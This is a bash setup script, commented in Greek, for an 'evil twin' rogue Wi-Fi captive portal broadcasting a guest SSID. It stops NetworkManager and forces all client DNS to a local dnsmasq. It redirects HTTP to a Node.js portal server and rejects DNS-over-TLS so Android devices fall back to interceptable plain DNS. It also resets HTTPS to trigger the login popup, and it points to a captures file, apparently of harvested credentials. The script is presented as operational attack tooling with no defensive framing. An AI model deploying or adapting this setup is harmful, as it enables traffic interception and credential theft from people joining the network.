#!/bin/bash

# Ρυθμίζει το δίκτυο για το evil twin captive portal.
# Τρέξε μία φορά πριν τα hostapd, dnsmasq, server.js.

IFACE=wlan0      # AP interface
INET=eth0        # uplink στο πραγματικό internet
AP_IP=10.0.0.1

sed -i 's/\r//' hostapd.conf dnsmasq.conf
sed -i "s/^interface=.*/interface=$IFACE/" hostapd.conf dnsmasq.conf

if [ ! -d "node_modules" ]; then
    echo "Installing Node.js dependencies..."
    npm install
fi

echo "Stopping NetworkManager..."
sudo systemctl stop NetworkManager
sudo airmon-ng check kill
sudo nmcli dev set $IFACE managed no 2>/dev/null || true

echo "Configuring $IFACE with IP $AP_IP..."
sudo ip link set $IFACE up
sudo ip addr flush dev $IFACE
sudo ip addr add $AP_IP/24 dev $IFACE

echo "Clearing old firewall rules..."
sudo iptables --flush
sudo iptables -t nat --flush
sudo iptables -X 2>/dev/null || true

# όλη η DNS κίνηση πάει στο τοπικό dnsmasq, ακόμα κι αν ο client έχει hardcoded DNS
echo "Redirecting DNS to local dnsmasq..."
sudo iptables -t nat -A PREROUTING -i $IFACE -p udp --dport 53 -j REDIRECT --to-port 53
sudo iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 53 -j REDIRECT --to-port 53

# HTTP probes captive portal -> τοπικός Node.js server
echo "Redirecting HTTP port 80 to Node.js on port 3000..."
sudo iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -j REDIRECT --to-port 3000

echo "Enabling NAT from $IFACE to $INET..."
sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
sudo iptables -t nat -A POSTROUTING -o $INET -j MASQUERADE

# DNS-over-TLS reject -> τα Android γυρνούν σε plain DNS που ήδη παγιδεύουμε
sudo iptables -A FORWARD -i $IFACE -p tcp --dport 853 -j REJECT --reject-with tcp-reset
sudo iptables -A FORWARD -i $IFACE -p udp --dport 853 -j REJECT

sudo iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT

# 443 reject με TCP RST για unauth clients -> το HTTPS probe αποτυγχάνει γρήγορα
# και το popup "Σύνδεση στο δίκτυο" εμφανίζεται αμέσως. Οι authorized έχουν per-IP ACCEPT.
sudo iptables -A FORWARD -i $IFACE -p tcp --dport 443 -j REJECT --reject-with tcp-reset

sudo iptables -A FORWARD -i $IFACE -j DROP

echo ""
echo "============================================"
echo "  AP interface : $IFACE"
echo "  Internet     : $INET"
echo "  Portal IP    : $AP_IP"
echo "  SSID         : GUESS_Guest"
echo ""
echo "  Next steps (run each in a separate terminal):"
echo "  1. sudo hostapd $(pwd)/hostapd.conf"
echo "  2. sudo dnsmasq -C $(pwd)/dnsmasq.conf -d"
echo "  3. sudo node $(pwd)/server.js"
echo ""
echo "  Captures file: $(pwd)/captures.txt"
echo "============================================"
